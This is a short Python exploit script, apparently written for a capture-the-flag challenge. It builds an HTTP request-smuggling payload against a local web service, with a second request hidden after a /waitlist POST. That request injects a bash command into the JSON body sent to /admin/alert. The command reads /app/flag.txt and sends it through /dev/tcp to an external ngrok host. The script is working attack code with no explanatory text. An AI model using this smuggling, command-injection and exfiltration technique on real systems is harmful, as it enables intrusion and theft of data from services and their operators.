URL = "127.0.0.1:4444"
# CMD = "whoami > /tmp/hello.world"
CMD = "cat /app/flag.txt > /dev/tcp/0.tcp.ap.ngrok.io/13266 <&1"

header = """
POST /waitlist HTTP/2
Host: %s
User-Agent: python-requests/2.28.0
Accept-Encoding: gzip, deflate
Accept: */*
Content-Length: 26

name=any&email=any@foo.com
""".strip() % URL

CMD = '{"msg": "~! bash -c \''+CMD+'\'"}'
payload = [
    "POST /admin/alert HTTP/1.1",
    "Host: {}".format(URL),
    "Content-Type: application/json",
    "Content-Length: {}".format(len(CMD)),
    "",
    CMD,
]

full_payload = header+'\n'.join(payload)+"\n"
print(full_payload)